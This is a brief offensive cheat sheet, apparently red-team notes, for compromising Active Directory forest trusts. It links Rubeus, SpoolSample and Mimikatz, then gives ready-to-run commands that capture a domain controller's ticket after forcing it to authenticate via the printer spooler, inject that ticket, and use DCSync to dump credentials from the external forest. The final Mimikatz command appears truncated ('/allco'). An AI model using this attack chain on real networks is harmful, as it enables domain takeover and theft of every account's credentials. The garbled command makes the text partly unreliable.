# 🟢 Breaking Forest Trusts



<table><thead><tr><th width="166">Tool</th><th>GitHub</th></tr></thead><tbody><tr><td>Rubeus</td><td><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></td></tr><tr><td>SpoolSample</td><td><a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></td></tr><tr><td>Mimikatz</td><td><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></td></tr></tbody></table>

### Breaking Forest Trusts with Rubeus

```
Rubeus.exe monitor /interval:5 /filteruser:target-dc$
```

#### Inject the Ticket

```
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>
```

### Breaking Forest Trusts with SpoolSample

```
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
```

### Breaking Forest Trusts with MimiKatz

```
lsadump::dcsync /domain:external.forest.local /allco
```
